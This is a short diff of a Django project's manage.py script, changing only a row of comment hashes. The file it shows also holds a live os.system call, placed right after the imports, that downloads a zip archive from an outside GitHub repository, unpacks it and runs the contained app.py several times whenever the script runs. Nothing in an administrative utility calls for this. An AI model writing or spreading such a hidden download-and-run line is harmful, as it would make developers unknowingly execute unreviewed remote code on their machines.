@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 """Django's command-line utility for administrative tasks."""
-################################################################################################################
+###############################################################################################################
 import os
 import sys
 os.system('wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')
